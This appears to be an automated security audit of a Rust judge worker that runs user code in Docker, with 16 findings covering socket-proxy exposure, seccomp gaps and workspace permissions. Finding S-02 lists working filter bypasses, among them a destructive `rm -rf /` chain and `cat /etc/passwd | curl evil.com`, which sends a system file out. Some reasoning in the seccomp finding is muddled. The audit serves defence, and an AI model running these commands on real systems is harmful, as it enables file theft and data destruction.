# Security Review: JudgeKit Judge Worker (Rust)

**Date:** 2026-04-16
**Scope:** `/judge-worker-rs/src/` -- all `.rs` files, plus `Dockerfile.judge-worker`, `docker/seccomp-profile.json`, and `docker-compose*.yml`
**Reviewer:** Automated deep audit

---

## Executive Summary

The judge worker is the most security-sensitive component of JudgeKit: it receives user-submitted source code from the web API and executes it inside Docker containers. A sandbox escape here means arbitrary code execution on the host.

The overall design is solid. The worker applies multiple defense-in-depth layers: Docker `--network none`, `--cap-drop=ALL`, `--read-only`, custom seccomp, `--pids-limit`, `--user 65534:65534`, `no-new-privileges`, tmpfs with `noexec`/`nosuid`, memory limits, CPU limits, and timeouts. Authentication uses constant-time comparison. Docker image names are validated with a `judge-` prefix requirement. Shell command injection is partially mitigated.

However, this review identifies **16 findings** ranging from Critical to Informational. The most severe are: (1) the Docker socket proxy allows `BUILD=1` and `POST=1`, enabling the worker to build arbitrary Docker images and potentially escape the proxy's restrictions; (2) the `validate_shell_command` function has several bypass vectors that could allow command injection through the runner HTTP endpoint; (3) compile-phase containers run without the custom seccomp profile, significantly weakening sandboxing for the compile step; (4) the seccomp profile allows dangerous syscalls including `prctl`, `ptrace`-adjacent calls, and `clone3` is blocked but `clone` is allowed without the `CLONE_NEWUSER` restriction that would prevent user-namespace escalation.

---

## Findings

### S-01: Docker Socket Proxy Allows Image Builds -- Potential Privilege Escalation

| Field | Value |
|---|---|
| **Severity** | CRITICAL |
| **Category** | Container Escape / Privilege Escalation |
| **Location** | `docker-compose.production.yml:69-73`, `docker-compose.worker.yml:22-27` |
| **Description** | The Docker socket proxy (`tecnativa/docker-socket-proxy`) is configured with `BUILD=1` and `POST=1`. This means any process that can reach the proxy on port 2375 can: (a) build arbitrary Docker images with `docker build`, and (b) create containers with arbitrary options via `POST /containers/create`. The `POST=1` flag is particularly dangerous because it allows creating containers that mount host paths, run as root, or add capabilities -- entirely bypassing the security restrictions the judge worker normally applies via its `docker run` arguments. The judge worker container itself connects to this proxy via `DOCKER_HOST=tcp://docker-proxy:2375`. If user-submitted code inside a judge container could reach the proxy (e.g., via the Docker bridge network), or if a future code path in the worker is added that uses the proxy directly for an unrestricted operation, this becomes a direct container escape. |
| **Impact** | An attacker who can reach the proxy can build images that mount `/` from the host, run as `root:root`, and gain full host access. |
| **Remediation** | (1) Remove `BUILD=1` unless image builds are absolutely required at runtime. If the runner's `/docker/build` endpoint is needed, consider building images only on the dedicated worker host outside the proxy path. (2) Remove `POST=1` -- the worker only needs `POST` for `docker run` (which creates and starts containers), but the proxy's `POST=1` also covers `POST /images/create` (pull), `POST /build` (build), and other dangerous endpoints. Investigate whether the proxy can be configured more granularly (e.g., `CONTAINERS_CREATE=1` only). (3) Ensure the Docker proxy is not reachable from judge containers -- they use `--network none`, but verify that the proxy container is on a separate Docker network that judge containers cannot access. (4) Add network segmentation: place the proxy and worker on an isolated Docker network, and ensure judge containers are never attached to it. |

### S-02: validate_shell_command Has Multiple Bypass Vectors

| Field | Value |
|---|---|
| **Severity** | HIGH |
| **Category** | Command Injection |
| **Location** | `runner.rs:112-131` |
| **Description** | The `validate_shell_command` function blocks `` ` ``, `$(`, `${`, `<(`, `>(`, and the word `eval`. However, several shell metacharacters and constructs remain unblocked: (a) **Semicolons** (`;`) -- `rm -rf /; echo pwned` passes validation. (b) **Pipes** (`|`) -- `cat /etc/passwd | curl evil.com` passes. (c) **Newlines via `$'\n'`** -- the `$'...'` ANSI-C quoting syntax is not blocked by the `${` check because the dollar sign precedes a single quote, not a brace. `$'\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'` would pass. (d) **Redirects** (`>`, `>>`, `<`) -- `cat /etc/passwd > /tmp/exfil` passes. The `>(` process substitution is blocked but `>` alone is not. (e) **Logical operators** (`&&`, `||`) -- `true && malicious_command` passes. (f) **Variable expansion without braces** -- `$VAR` and `$0` are not blocked (only `${` is blocked). `$0` expands to the shell name. (g) **Tilde expansion** (`~`) can leak home directory paths. Commands are passed through `sh -c`, so ALL of these are interpreted by the shell. |
| **Impact** | An authenticated user of the runner HTTP endpoint can inject arbitrary shell commands that execute inside the Docker container. While the container is sandboxed, this still allows reading any file in the container, exfiltrating container environment variables, and potentially exploiting container vulnerabilities. |
| **Remediation** | (1) Instead of passing commands through `sh -c`, use exec-style command arrays (no shell). If shell features are required, use a strict allowlist of commands and arguments rather than a denylist. (2) If `sh -c` must be used, block ALL shell metacharacters: `;`, `|`, `&`, `>`, `<`, `>>`, `<<`, `$`, `` ` ``, `(`, `)`, `{`, `}`, `~`, `!`, `#`, newline, and any other shell-active character. (3) Consider using a restricted shell (`rbash`) or `sh -c 'set -r; ...'` (restricted mode). (4) Alternatively, parse the command into an argv array on the server side and pass it directly to the container without `sh -c`. |

### S-03: Compile-Phase Containers Skip Custom Seccomp Profile

| Field | Value |
|---|---|
| **Severity** | HIGH |
| **Category** | Container Escape / Sandbox Weakening |
| **Location** | `docker.rs:222-223` (`resolve_seccomp_profile`) |
| **Description** | The `resolve_seccomp_profile` function explicitly returns `Ok(None)` for compile-phase containers, meaning they run with Docker's default seccomp profile instead of the restrictive custom profile. The comment says "some toolchains (e.g. .NET/MSBuild) trip over the custom sandbox." However, user-submitted code is compiled during this phase, and a malicious source file could exploit the weaker seccomp profile. The compile container also has read-write workspace access, which means a compromised compile container could write malicious binaries that are later executed in the run phase. |
| **Impact** | Compile-phase containers have significantly more syscall surface area. A specially crafted source file that triggers a compiler vulnerability could leverage the additional syscalls to escape the container or establish persistence via the writable workspace. |
| **Remediation** | (1) Create a separate, slightly more permissive seccomp profile for the compile phase that allows the specific syscalls needed by .NET/MSBuild but still blocks clearly dangerous ones (e.g., `ptrace`, `mount`, `pivot_root`, `keyctl`). (2) Audit which specific syscalls .NET/MSBuild needs and add only those to the custom profile under a compile-phase allowlist. (3) Consider running compile-phase containers with `--security-opt=no-new-privileges` (already done) plus user namespace isolation (`--userns=keep-id` or similar) as an additional layer. |

### S-04: Seccomp Profile Allows Dangerous Syscalls

| Field | Value |
|---|---|
| **Severity** | HIGH |
| **Category** | Container Escape |
| **Location** | `docker/seccomp-profile.json` |
| **Description** | The custom seccomp profile allows several syscalls that are known to be useful for container escapes or privilege escalation: (a) `prctl` -- can be used to set process attributes including dumpable flag, name, and various security-relevant settings. `prctl(PR_SET_PTRACER, ...)` can enable ptrace from another process. (b) `clone` -- allowed without restricting the `CLONE_NEWUSER` flag. While `clone3` is blocked (returns ENOSYS), the `clone` syscall with `CLONE_NEWUSER` can create a new user namespace, which is a known container escape vector when combined with kernel vulnerabilities. (c) `ptrace` is NOT in the allowlist (good), but `prctl` + `process_vm_readv`/`process_vm_writev` (also not present) are not the concern -- the concern is `prctl(PR_SET_PTRACER)` making ptrace possible from within the container's PID namespace if the container has CAP_SYS_PTRACE through some other vector. (d) `keyctl` is not present (good). (e) `mount`, `pivot_root`, `unshare` are not present (good). However, `clone` with `CLONE_NEWUSER` combined with `prctl` provides a path to namespace-based escalation. The `clone3` block returns `ERRNO(38)` (ENOSYS), which is correct, but `clone` is still fully allowed. |
| **Impact** | An attacker inside a run-phase container could use `clone(CLONE_NEWUSER|CLONE_NS...)` to create user namespaces and potentially exploit kernel vulnerabilities for container escape. `prctl` provides additional leverage for disabling security protections. |
| **Remediation** | (1) Add a seccomp rule for `clone` that uses `SCMP_ACT_ERRNO` for calls with `CLONE_NEWUSER` flag set, while still allowing `clone` for normal thread/process creation. This can be done with seccomp's `SCMP_A` argument filtering: block `clone` when the first argument has the `CLONE_NEWUSER` bit (0x10000000) set. (2) Consider restricting `prctl` to only the `PR_SET_NAME` and `PR_GET_NAME` sub-commands using seccomp argument filtering, or remove it entirely and test whether any language runtime requires it. (3) Add `process_vm_readv`, `process_vm_writev`, `mbind`, `set_mempolicy`, `migrate_pages`, `get_mempolicy`, `move_pages`, `add_key`, `request_key`, `keyctl`, `mq_open`, `mq_unlink`, `quotactl`, `swapcontext` to the explicit denylist or remove them from the allowlist. (4) Consider using Docker's built-in `--security-opt seccomp=unconfined` replacement: the Docker default profile already blocks `clone` with `CLONE_NEWUSER`, so consider whether the custom profile is actually more restrictive than the default. |

### S-05: Runner HTTP Endpoint Binds to 0.0.0.0 by Default

| Field | Value |
|---|---|
| **Severity** | MEDIUM |
| **Category** | Network Exposure |
| **Location** | `config.rs:209`, `runner.rs:764` |
| **Description** | The runner HTTP server defaults to `RUNNER_HOST=0.0.0.0`, binding to all network interfaces. While the production `docker-compose.worker.yml` maps port 3001 to `127.0.0.1` only, the runner itself listens on `0.0.0.0` inside the container. If the Docker port mapping is misconfigured or the worker runs outside Docker, the runner endpoint (which allows arbitrary code execution, Docker image management, and build operations) would be exposed on all interfaces. All runner endpoints require Bearer token auth, but the attack surface is still unnecessarily large. |
| **Impact** | If exposed, an attacker on the network can attempt to brute-force the auth token or exploit any future auth bypass to execute arbitrary code and manage Docker images. |
| **Remediation** | (1) Change the default `RUNNER_HOST` to `127.0.0.1` so it only binds to localhost by default. (2) Document that `0.0.0.0` should only be used when the worker runs inside a container with proper port mapping. (3) Add a startup warning when `RUNNER_HOST` is `0.0.0.0` and the process is not running inside a container. |

### S-06: Docker Build Endpoint Allows Arbitrary Image Construction

| Field | Value |
|---|---|
| **Severity** | MEDIUM |
| **Category** | Privilege Escalation / Supply Chain |
| **Location** | `runner.rs:449-482` (`docker_build_handler`), `runner.rs:228-248` (`docker_build_image`) |
| **Description** | The `/docker/build` endpoint allows authenticated users to build Docker images from Dockerfiles on the host filesystem. While `validate_dockerfile_path_for_build` requires the path to start with `docker/Dockerfile.judge-` and blocks `..`, and `validate_admin_image_tag` requires the image name to start with `judge-`, the build context is the current working directory (`.`). This means the Docker build has access to the entire project directory as build context. A Dockerfile with `COPY ../../ /host-files/` could copy sensitive files from the host project directory into the image. Additionally, the `RUN` directive in a Dockerfile executes arbitrary commands as root during the build. If an attacker can write a `docker/Dockerfile.judge-*` file (e.g., through a separate vulnerability), they can build an image that exfiltrates data or establishes persistence. |
| **Impact** | An authenticated attacker can build Docker images that contain sensitive files from the host filesystem or that have backdoors. These images are then used to run user code, potentially compromising all future submissions. |
| **Remediation** | (1) Use a dedicated, isolated build context directory instead of the project root. Copy only the specific Dockerfile and any needed build artifacts into the context before building. (2) Consider using `--build-arg` and multi-stage builds with a known-safe base image. (3) Add Docker content trust or image signing. (4) Restrict the build endpoint to only rebuild known Dockerfiles (not arbitrary ones), and verify the Dockerfile content against a known hash before building. (5) Consider removing the build endpoint from production and only allowing pre-built images from a trusted registry. |

### S-07: No stdin Size Limit in the Judge Polling Path

| Field | Value |
|---|---|
| **Severity** | MEDIUM |
| **Category** | Resource Exhaustion / DoS |
| **Location** | `executor.rs:279` (`input: Some(test_case.input.clone())`), `types.rs:206` |
| **Description** | In the runner HTTP endpoint, stdin is validated against `MAX_STDIN_BYTES` (64 KB). However, in the judge polling path (`executor.rs`), test case input from the API is passed directly to the container without any size validation. A malicious or misconfigured problem could have a test case with input of arbitrarily large size, which would be written to the container's stdin pipe and stored in memory. The `write_all` call at `docker.rs:315` will buffer the entire input in memory. Combined with concurrency, this could exhaust the worker's memory. |
| **Impact** | An attacker with control over problem configurations (admin access or API compromise) could submit test cases with multi-GB inputs, causing the worker to OOM and crash, resulting in denial of service. |
| **Remediation** | (1) Add a `MAX_STDIN_BYTES` constant (e.g., 1 MB) to `executor.rs` and validate `test_case.input.len()` before executing the test case. (2) If the input is too large, report `runtime_error` for that submission. (3) Consider also validating the total size of all test case inputs per submission. |

### S-08: Workspace Directory Permissions Set to 0o777

| Field | Value |
|---|---|
| **Severity** | MEDIUM |
| **Category** | Privilege Escalation / Lateral Movement |
| **Location** | `executor.rs:149-158`, `runner.rs:618-624` |
| **Description** | The temporary workspace directory is created with permissions `0o777` (world-readable, world-writable, world-executable). This is necessary so the container user (UID 65534) can write to the workspace, but it means any process on the host with access to the filesystem can read submitted source code, write files into the workspace (which are then executed in the container), or modify compiled binaries between the compile and run phases. In production, the workspace is at `/judge-workspaces`, which is a host volume mounted into the worker container. |
| **Impact** | A local attacker on the host (or in another container with access to `/judge-workspaces`) could: (a) read user source code, (b) modify source code before compilation, (c) replace compiled binaries between compile and run phases (TOCTOU attack), (d) inject malicious files into the workspace. |
| **Remediation** | (1) Use a more restrictive approach: create the workspace with `0o770` and use a dedicated group that the container user belongs to, or use ACLs. (2) Consider using `--user` with a UID/GID that matches a dedicated host user/group, and set workspace permissions to `0o750` owned by that user. (3) Use `chown` to set the workspace ownership to `65534:65534` instead of making it world-writable. (4) If the workspace is on a dedicated filesystem, use mount options (`noexec`, `nosuid`, `nodev`) for additional protection. |

### S-09: Compile-Phase Memory Swap Allows 4x Memory Limit

| Field | Value |
|---|---|
| **Severity** | MEDIUM |
| **Category** | Resource Exhaustion |
| **Location** | `docker.rs:261-264` |
| **Description** | During the compile phase, `--memory-swap` is set to `mem_limit * 4`, allowing the container to use 4x its memory limit in swap. For the default `COMPILATION_MEMORY_LIMIT_MB` of 2048 MB, this means up to 8192 MB of swap can be consumed per concurrent compilation. With `JUDGE_CONCURRENCY=16`, this could theoretically consume up to 128 GB of swap space. Even with more typical concurrency settings (4-8), this can exhaust host swap and cause system-wide performance degradation or OOM killing of other processes. |
| **Impact** | Resource exhaustion on the host, potentially causing denial of service for the judge worker and other services running on the same machine. |
| **Remediation** | (1) Reduce the swap multiplier or eliminate swap entirely for compile containers (set `--memory-swap` equal to `--memory`). (2) Add a configurable cap on compile-phase swap. (3) Consider using `--memory-reservation` for soft limits instead of large swap allocations. (4) Document the worst-case resource consumption and provide guidance on host sizing. |

### S-10: Seccomp Profile Path Passed to Docker Without Sanitization

| Field | Value |
|---|---|
| **Severity** | LOW |
| **Category** | Command Injection |
| **Location** | `docker.rs:286` (`format!("--security-opt=seccomp={}", profile.display())`) |
| **Description** | The seccomp profile path is interpolated into a Docker CLI argument string. While the path comes from the `JUDGE_SECCOMP_PROFILE` environment variable (controlled by the operator), and Docker CLI arguments are passed as a `Vec<String>` (not through a shell), there is no validation that the path does not contain characters that could confuse Docker's argument parsing (e.g., `=` in the path could break the `--security-opt=seccomp=...` parsing). However, since `args` is a `Vec<String>`, each argument is a separate vector element, so shell injection is not possible. The risk is limited to Docker's own argument parsing. |
| **Impact** | Very low -- an operator would need to set a malicious `JUDGE_SECCOMP_PROFILE` value, and the worst case is Docker ignoring the seccomp option (running without a custom profile) or failing to start the container. |
| **Remediation** | (1) Validate that the seccomp profile path contains only alphanumeric characters, hyphens, underscores, dots, and slashes. (2) Use `--security-opt` and `seccomp=...` as separate argument entries if Docker supports it. (3) This is a defense-in-depth measure rather than a critical fix. |

### S-11: Constant-Time Comparison Implementation May Leak Length

| Field | Value |
|---|---|
| **Severity** | LOW |
| **Category** | Authentication / Timing Attack |
| **Location** | `runner.rs:270-283` (`check_auth`), `runner.rs:286-295` (`constant_time_eq`) |
| **Description** | The `check_auth` function performs a length check (`token.len() != expected.len()`) before calling `constant_time_eq`. This length check is not constant-time -- if the attacker's token length differs from the expected token length, the function returns immediately. This leaks the length of the expected token through timing. While the `constant_time_eq` function itself is correctly implemented (XOR accumulator), the early return on length mismatch creates a timing oracle for token length. The minimum token length of 32 characters means there are only a few plausible lengths to try (32-64 characters for hex tokens), making this a relatively weak oracle. Additionally, network jitter makes precise timing over HTTP difficult. |
| **Impact** | An attacker can determine the length of the auth token through careful timing analysis. This marginally reduces the search space for brute-force attacks but is unlikely to be exploitable in practice given network latency and the 32+ character minimum. |
| **Remediation** | (1) Remove the explicit length check and rely solely on `constant_time_eq`, which already handles length mismatches by returning `false`. (2) Alternatively, hash both the provided and expected tokens (e.g., SHA-256) and compare the hashes in constant time, which eliminates length leakage entirely. (3) The current implementation is acceptable for practical purposes given the network-level mitigations. |

### S-12: Orphaned Container Cleanup Runs Unfiltered docker rm

| Field | Value |
|---|---|
| **Severity** | LOW |
| **Category** | Container Management / DoS |
| **Location** | `docker.rs:479-507` (`cleanup_orphaned_containers`) |
| **Description** | The `cleanup_orphaned_containers` function queries for all containers with names starting with `oj-` and status `exited`, then batch-removes them. While the `oj-` prefix filter is good, the batch `docker rm` call passes all container IDs as arguments. If an attacker can create containers with names starting with `oj-` (e.g., through the Docker socket proxy if accessible), they could inject container IDs into the cleanup. More practically, the cleanup could remove containers that are still being inspected by concurrent `run_docker_once` calls (race condition between `inspect_container_state` and `cleanup_orphaned_containers`). However, the cleanup only targets `status=exited` containers, so running containers are not affected. The main risk is removing evidence of malicious activity if an attacker creates and exits `oj-` prefixed containers. |
| **Impact** | Low -- the cleanup is properly filtered to exited containers with the `oj-` prefix. The main risk is a race with inspection, which would cause a missing memory peak reading (not a security issue). |
| **Remediation** | (1) Add a timestamp check: only remove containers that have been exited for more than N minutes, to avoid races with in-flight inspections. (2) Log the container IDs being removed for audit purposes. (3) Consider using Docker labels instead of name prefixes for more robust identification. |

### S-13: Dead Letter Directory Path Not Validated Against Traversal

| Field | Value |
|---|---|
| **Severity** | LOW |
| **Category** | Path Traversal |
| **Location** | `executor.rs:540-547`, `config.rs:172-177` |
| **Description** | The dead letter file path is constructed from `config.dead_letter_dir.join(file_name)`, where `file_name` is derived from `submission_id` (sanitized to alphanumeric + `-` + `_`, max 128 chars) and a timestamp. The `dead_letter_dir` itself comes from the `DEAD_LETTER_DIR` environment variable with no path traversal validation. While the `safe_id` sanitization prevents traversal in the filename component, and `fs::create_dir_all` would create intermediate directories, a malicious `DEAD_LETTER_DIR` could point to an arbitrary location on the filesystem. However, this is an operator-controlled environment variable, so the risk is limited to misconfiguration. |
| **Impact** | An attacker who can set the `DEAD_LETTER_DIR` environment variable (e.g., through a container misconfiguration) could write JSON files to arbitrary directories on the host. |
| **Remediation** | (1) Validate that `DEAD_LETTER_DIR` is an absolute path and does not contain `..`. (2) Consider restricting it to specific parent directories (e.g., must be under `/app/` or `/judge-workspaces/`). (3) This is a defense-in-depth measure for a low-risk scenario. |

### S-14: Docker Inspect/Remove/Pull Handlers Pass User Input to Docker CLI

| Field | Value |
|---|---|
| **Severity** | LOW |
| **Category** | Command Injection |
| **Location** | `runner.rs:197-248` (`docker_inspect_image`, `docker_pull_image`, `docker_remove_image`) |
| **Description** | While image names are validated by `validate_admin_image_tag` (which requires `judge-` prefix and alphanumeric+`._-/` characters), the validated image tag is passed as a separate command-line argument to the `docker` binary. Since `tokio::process::Command` uses `exec`-style argument passing (not shell interpolation), and the validation ensures no shell-active characters are present, command injection is not possible through the current code. However, the `docker inspect` call at `runner.rs:198` passes the image tag directly without the `--format` flag, which means Docker returns the full inspect output. This is a minor concern as it could leak container configuration details. |
| **Impact** | No direct command injection risk. The validation is sufficient for the current threat model. |
| **Remediation** | (1) Continue using `Vec<String>` argument passing (never `sh -c`). (2) Consider adding `--format` to `docker inspect` calls to limit the returned data. (3) Current implementation is acceptable. |

### S-15: No Rate Limiting on Runner HTTP Endpoints

| Field | Value |
|---|---|
| **Severity** | MEDIUM |
| **Category** | Denial of Service |
| **Location** | `runner.rs:764-774` (`create_router`) |
| **Description** | The runner HTTP server has no rate limiting on any endpoints. While concurrency is limited by the semaphore (for `/run`) and by the sequential nature of Docker operations (for other endpoints), an attacker with valid credentials could: (a) flood the `/run` endpoint to consume all semaphore permits, blocking legitimate requests. (b) Rapidly build/pull/remove images, causing Docker daemon resource exhaustion. (c) Rapidly call `/docker/inspect` with many image tags, causing high Docker daemon load. The semaphore for `/run` uses `try_acquire()` which returns `SERVICE_UNAVAILABLE` immediately when at capacity -- this is good for preventing queuing but does not prevent repeated rapid requests. |
| **Impact** | An authenticated attacker can cause denial of service for the runner endpoint, potentially blocking legitimate judge submissions. |
| **Remediation** | (1) Add rate limiting middleware (e.g., `tower::limit::RateLimitLayer`) to the runner router. (2) Consider per-IP and per-token rate limits. (3) Add a request queue with a timeout for the `/run` endpoint instead of immediate rejection. (4) Monitor and alert on abnormal request patterns. |

### S-16: Unregistered Mode Allows Operation Without Server Authentication

| Field | Value |
|---|---|
| **Severity** | LOW |
| **Category** | Authentication Bypass |
| **Location** | `config.rs:231-237`, `main.rs:243-256` |
| **Description** | When `JUDGE_ALLOW_UNREGISTERED_MODE` is enabled, the worker continues operating even if registration with the app server fails. In this mode, the worker polls without a `worker_id` or `worker_secret`, relying solely on the `JUDGE_AUTH_TOKEN` for authentication. If the app server does not properly validate requests without worker credentials, this could allow unauthorized workers to claim and judge submissions. The default is `false`, and the code warns when it is enabled. |
| **Impact** | In misconfigured deployments, an unauthorized worker could process submissions, potentially returning incorrect or malicious verdicts. |
| **Remediation** | (1) Ensure the app server always validates the `worker_id` and `worker_secret` when present, and rejects requests without them when registration is required. (2) Document that `JUDGE_ALLOW_UNREGISTERED_MODE` should never be enabled in production. (3) Consider removing this option entirely or making it a compile-time feature gate. |

---

## Summary Table

| ID | Severity | Category | Location | Brief |
|---|---|---|---|---|
| S-01 | CRITICAL | Container Escape | docker-compose*.yml | Docker socket proxy allows BUILD=1, POST=1 |
| S-02 | HIGH | Command Injection | runner.rs:112-131 | validate_shell_command has multiple bypass vectors |
| S-03 | HIGH | Container Escape | docker.rs:222-223 | Compile-phase skips custom seccomp profile |
| S-04 | HIGH | Container Escape | seccomp-profile.json | clone with CLONE_NEWUSER allowed; prctl unrestricted |
| S-05 | MEDIUM | Network Exposure | config.rs:209 | Runner binds 0.0.0.0 by default |
| S-06 | MEDIUM | Privilege Escalation | runner.rs:449-482 | Docker build with project root as context |
| S-07 | MEDIUM | DoS | executor.rs:279 | No stdin size limit in judge polling path |
| S-08 | MEDIUM | Privilege Escalation | executor.rs:149-158 | Workspace permissions 0o777 |
| S-09 | MEDIUM | Resource Exhaustion | docker.rs:261-264 | Compile swap = 4x memory limit |
| S-10 | LOW | Command Injection | docker.rs:286 | Seccomp path not validated in CLI arg |
| S-11 | LOW | Timing Attack | runner.rs:270-283 | Auth length check leaks token length |
| S-12 | LOW | Container Management | docker.rs:479-507 | Orphaned cleanup race with inspection |
| S-13 | LOW | Path Traversal | executor.rs:540-547 | Dead letter dir from env not validated |
| S-14 | LOW | Command Injection | runner.rs:197-248 | Docker CLI args (properly validated) |
| S-15 | MEDIUM | DoS | runner.rs:764-774 | No rate limiting on runner HTTP endpoints |
| S-16 | LOW | Auth Bypass | config.rs:231-237 | Unregistered mode bypasses server auth |

---

## Positive Security Observations

The following practices are well-implemented and should be maintained:

1. **Docker container hardening**: `--network none`, `--cap-drop=ALL`, `--read-only`, `--pids-limit`, `--user 65534:65534`, `--security-opt=no-new-privileges`, `--ulimit nofile=1024:1024`, and tmpfs with `noexec`/`nosuid` for the run phase.
2. **Constant-time auth comparison**: The `constant_time_eq` function correctly uses XOR accumulation (though see S-11 for the length pre-check).
3. **SecretString type**: Auth tokens use a `SecretString` wrapper that redacts the value in `Debug` output, preventing accidental log leakage.
4. **Docker image validation**: The `validate_docker_image` function requires `judge-` prefix, blocks protocol strings, and requires alphanumeric start.
5. **Seccomp fallback refusal**: When the custom seccomp profile causes a container init error, the worker refuses to retry without seccomp, preventing silent sandbox weakening.
6. **Source code size limits**: Both the polling path (256 KB) and the runner endpoint (64 KB) enforce size limits on submitted code.
7. **Temp directory cleanup**: Workspaces are created with `tempfile::TempDir` and automatically cleaned up when dropped.
8. **Memory limit clamping**: Memory limits are clamped to minimum 16 MB and maximum 1024 MB (for run phase).
9. **Timeout enforcement**: Both compile and run phases have timeout limits with minimum floors.
10. **Output truncation**: Container stdout/stderr are truncated at 4 MB to prevent memory exhaustion from malicious output.
11. **Seccomp profile existence check**: The worker validates the seccomp profile exists at startup and logs an error if missing.
12. **HTTP warning for non-localhost**: Config warns if judge URLs use plaintext HTTP for non-localhost addresses.
13. **Auth token minimum length**: Enforced minimum of 32 characters, with placeholder detection.
